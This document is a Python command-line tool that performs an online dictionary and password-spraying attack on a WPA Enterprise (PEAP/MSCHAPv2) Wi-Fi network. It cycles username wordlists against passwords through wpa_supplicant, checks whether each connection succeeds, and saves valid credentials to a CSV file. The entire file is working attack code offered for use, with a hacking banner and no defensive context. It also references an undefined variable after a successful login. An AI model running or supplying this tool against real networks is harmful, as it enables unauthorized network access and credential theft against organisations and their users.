#!/usr/bin/env python

import argparse
import datetime
import time
import sys
import os
import colorama
from colorama import Fore, Style, Back
from wpa_supplicant.core import WpaSupplicantDriver
from twisted.internet.selectreactor import SelectReactor
import threading

colorama.init(autoreset=True)

def print_banner():
    banner = f"""
{Fore.RED}  __        ___           _    _ _                        
{Fore.RED}  \ \      / (_)         | |  | (_)                       
{Fore.RED}   \ \ /\ / / _ _ __   __| |  | |_ _ __  _   ___  __      
{Fore.RED}    \ V  V / | | '_ \ / _` |  | | | '_ \| | | \ \/ /      
{Fore.RED}     \_/\_/  |_| .__/\__,_|  |_|_| .__/|_| |_||__/       
{Fore.RED}               | |                | |                   
{Fore.RED}               |_|                |_|                   
{Fore.YELLOW}  _    _  ____  _      ____   ___   _____ ____  _____ 
{Fore.YELLOW} / \  / \/  _ \/ \  /|/  _ \ / _ \ /  __//  _ \/  __/
{Fore.YELLOW}| |  \| || / \|| |\ ||| | \/(  _  )|  \  | / \||  \  
{Fore.YELLOW}| |  || || \_/|| | \||| |_/ | (_) ||  /_ | \_/||  /_ 
{Fore.YELLOW} \_/  \_/\____/\_/  \|\____/ \___/ \____\\____/\____\\{Style.RESET_ALL}
"""
    print(banner)

def print_section(title):
    print(f"\n{Fore.CYAN}{'=' * 60}")
    print(f"{title.center(60)}")
    print(f"{'=' * 60}{Style.RESET_ALL}")

def timestamp():
    now = datetime.datetime.now()
    return now.strftime("%Y-%m-%d %H:%M:%S")

def get_elapsed_time(start_time):
    elapsed_time = time.time() - start_time
    return str(datetime.timedelta(seconds=int(elapsed_time)))

def connect_to_wifi(ssid, password, username,
                    interface, supplicant, outfile=None,
                    authentication="wpa-enterprise"):
    valid_credentials_found = False

    print(f"{Fore.YELLOW}Trying {username}:{password}...{Style.RESET_ALL}")

    # WPA Enterprise configuration
    if authentication == "wpa-enterprise":
        network_params = {
            "ssid": ssid,
            "key_mgmt": "WPA-EAP",
            "eap": "PEAP",
            'identity': username,
            'password': password,
            "phase2": "auth=MSCHAPV2",
        }

    # Remove all the networks currently assigned to this interface
    for network in interface.get_networks():
        network_path = network.get_path()
        interface.remove_network(network_path)

    # Add target network to the interface and connect to it 
    interface.add_network(network_params)
    target_network = interface.get_networks()[0].get_path()

    interface.select_network(target_network)

    # Check the status of the wireless connection
    credentials_valid = 0
    max_wait = 4.5
    # How often, in seconds, the loop checks for successful authentication
    test_interval = 0.1  # Increased interval for more readable output
    seconds_passed = 0
    while seconds_passed <= max_wait:
        try:
            state = interface.get_state()
            # print(f"{Fore.BLUE}Current state: {state}{Style.RESET_ALL}")
            if state == "completed":
                credentials_valid = 1
                break
        except Exception as e:
            print(f"{Fore.RED}{str(e)}{Style.RESET_ALL}")
            break

        time.sleep(test_interval)
        seconds_passed += test_interval

    if credentials_valid == 1:
        print(f"{Fore.GREEN}[!] VALID CREDENTIALS: {username}:{password}{Style.RESET_ALL}")
        if outfile:
            with open(outfile, 'a', encoding='utf-8') as f:
                csv_output = "\"{}\",\"{}\",\"{}\",\"{}\"\n".format(
                    timestamp(), ssid, username, password
                )
                f.write(csv_output)
        valid_credentials_found = True

    # Disconnect from the network
    try: interface.disconnect_network()
    except: pass

    try: interface.remove_network(target_network)
    except: pass

    return valid_credentials_found


# Check for sudo/root privileges
if os.geteuid() != 0:
    print(f"{Fore.RED}This script must be run as root or with sudo.{Style.RESET_ALL}")
    sys.exit(1)

print_banner()

# Handle command-line arguments and generate usage text.
description = "Perform an online, horizontal dictionary attack against a WPA Enterprise network."

parser = argparse.ArgumentParser(
    description=description, add_help=False,
    formatter_class=argparse.ArgumentDefaultsHelpFormatter
)
parser.add_argument('-i', type=str, required=True, metavar='interface',
                    dest='device', help='Wireless interface')
parser.add_argument('-e', type=str, required=True,
                    dest='ssid', help='SSID of the target network')
parser.add_argument('-u', type=str, required=True, dest='userfile',
                    help='Username wordlist')
parser.add_argument('-P', dest='password', default=None,
                    help='Password to try on each username')
parser.add_argument('-p', dest='passfile', default=None,
                    help='List of passwords to try for each username')
parser.add_argument('-s', type=int, default=0, dest='start', metavar='line',
                    help='Optional start line to resume attack. May not be used with a password list.')
parser.add_argument('-w', type=str, default=None, dest='outfile',
                    help='Save valid credentials to a CSV file')
parser.add_argument('-1', default=False, dest='stop_on_success',
                    action='store_true',
                    help='Stop after the first set of valid credentials are found')
parser.add_argument('-t', default=0.5, metavar='seconds', type=float,
                    dest='attempt_delay',
                    help='Seconds to sleep between each connection attempt')
# Workaround to make help display without adding "-h" to the usage line
if "-h" in sys.argv or "--help" in sys.argv or len(sys.argv) == 1:
    parser.print_help()
    exit()
args = parser.parse_args()

if (args.password is None) and (args.passfile is None):
    print(f"{Fore.RED}You must specify a password or password list.{Style.RESET_ALL}")
    exit()

if (args.start != 0) and (args.passfile is not None):
    print(f"{Fore.RED}The start line option may not be used with a password list.{Style.RESET_ALL}")
    exit()

device = args.device
ssid = args.ssid
userfile = args.userfile
password = args.password
passfile = args.passfile
start = args.start
outfile = args.outfile
stop_on_success = args.stop_on_success
attempt_delay = args.attempt_delay

if passfile is not None:
    with open(passfile, 'r') as f:
        content = f.read()
    passwords = content.replace("\r", "").split("\n")
    # If there is a trailing line at the end of the file, remove it from
    # the password list
    if passwords[-1] == "":
        passwords = passwords[0:-1]
else:
    passwords = [password]

total_passwords = len(passwords)

# Start a simple Twisted SelectReactor
reactor = SelectReactor()
threading.Thread(target=reactor.run, kwargs={'installSignalHandlers': 0}).start()
time.sleep(0.1)  # let reactor start

# Start Driver
driver = WpaSupplicantDriver(reactor)

# Connect to the supplicant, which returns the "root" D-Bus object for wpa_supplicant
supplicant = driver.connect()

# Register an interface w/ the supplicant, this can raise an error if the supplicant
# already knows about this interface
try:
    interface = supplicant.get_interface(device)
except:
    interface = supplicant.create_interface(device)


# Read usernames into array, users
with open(userfile, 'r', encoding='utf-8') as f:
    users = [l.rstrip() for l in f.readlines()]

print_section("Starting Attack")

start_time = time.time()

try:
    for idx, password in enumerate(passwords):
        for n in range(start, len(users)):
            progress = f"{Fore.CYAN}[{idx + 1}/{total_passwords}] {Style.RESET_ALL}"
            elapsed_time = get_elapsed_time(start_time)
            output = f"{progress} Trying {Fore.CYAN}{users[n]}{Style.RESET_ALL} with password {Fore.YELLOW}{password}{Style.RESET_ALL} (Elapsed: {Fore.GREEN}{elapsed_time}{Style.RESET_ALL})"
            print(f"\r{output}", end="", flush=True)

            valid_credentials_found = connect_to_wifi(ssid=ssid,
                                                      username=str(users[n]),
                                                      password=str(password),
                                                      interface=interface,
                                                      supplicant=supplicant,
                                                      outfile=outfile)
            if valid_credentials_found:
                print(f"\n{Fore.GREEN}[!] VALID CREDENTIALS: {username}:{password}{Style.RESET_ALL}")
                if stop_on_success:
                    raise KeyboardInterrupt

            time.sleep(attempt_delay)

    print(f"\n{Fore.GREEN}DONE!{Style.RESET_ALL}")
    if reactor.running:
        reactor.stop()
    sys.exit(0)
except KeyboardInterrupt:
    # Stop the running reactor so the program can exit
    if reactor.running:
        reactor.stop()
    print(f"\n{Fore.YELLOW}Attack stopped by user.{Style.RESET_ALL}")
    sys.exit(0)
except Exception as e:
    print(f"\n{Fore.RED}{str(e)}{Style.RESET_ALL}")
    if reactor.running:
        reactor.stop()
    sys.exit(1)
